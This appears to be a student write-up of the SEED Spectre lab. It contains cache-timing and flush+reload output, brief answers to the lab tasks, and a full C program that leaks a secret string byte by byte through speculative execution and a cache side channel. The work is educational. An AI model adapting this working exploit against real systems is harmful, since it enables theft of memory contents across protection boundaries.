## SEED Spectre lab

###  Task1 Reading from cache

Output of benchmark:

```
[04/12/20]seed@VM:~/Spectre_Attack$ ./cachetime 
Access time for array[0*4096]: 1246 CPU cycles
Access time for array[1*4096]: 232 CPU cycles
Access time for array[2*4096]: 226 CPU cycles
Access time for array[3*4096]: 58 CPU cycles
Access time for array[4*4096]: 228 CPU cycles
Access time for array[5*4096]: 226 CPU cycles
Access time for array[6*4096]: 230 CPU cycles
Access time for array[7*4096]: 88 CPU cycles
Access time for array[8*4096]: 222 CPU cycles
Access time for array[9*4096]: 1134 CPU cycles
```

We can see cached values tend to have a 10x less latency

### Task 2

```
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
[04/12/20]seed@VM:~/Spectre_Attack$ 
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 

```

About 50% success rate

After changing threshold to 120, much higher success rate

```
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
[04/12/20]seed@VM:~/Spectre_Attack$ ./flushreload 
array[94*4096 + 1024] is in cache.
The Secret = 94.

```

### Task 3

1. After commenting out lines with asterisk, this attack no longer works.
2. size is 10. Then the consequence is that the training no longer works.

### Task 4

```
The normal version will have a lot of noise
```

### Final Task

We need to ignore position 0 because this address will always be cached since 0 is the normal output of restrictedAccess()

The way to process a 0 in the secret value is to make sure that the numbers of existence of every other characters are lower than a threshold value

``` C
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (120)
#define DELTA 1024
#define MAX_SECRET_LENGTH 30
#define MINIMUM_THRESHOLD 10

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  // we need to ignore i = 0 here, because 0 is the default return value
  // which will act as a bad noise 
  for (i = 1; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    //printf("#%d:%d\n", i, time2);
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  //printf("%d\n", s);
  array[s*4096 + DELTA] += 88;
}

int main() {
  int i;
  uint8_t s;
  int secret_length = 0;
  size_t larger_x;
  int max;
  // since we omit zero above, we may ignore "true" zero 
  int zero = 0;
  while(1){
    larger_x = (size_t)(secret + secret_length -(char*)buffer);
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 1000; i++) {
      flushSideChannel();	
      spectreAttack(larger_x);
      reloadSideChannelImproved();
      //flushSideChannel();
    }
    max = 0;
    for (i = 0; i < 256; i++){
      if(scores[max] < scores[i]){
      	max = i;
      }
    }
    if (scores[max] < MINIMUM_THRESHOLD) {
    	// printf("%d\n", scores[max]);
    	zero = 1;
    }
    if (zero || secret_length > MAX_SECRET_LENGTH) {
		break;
    }
    secret_length++;
    printf("Reading #%d secret value at %p = ", secret_length, (void*)larger_x);
    printf("The  secret value is %d\n", max);
    printf("The number of hits is %d\n", scores[max]);
    
  }
  return (0); 
}

```

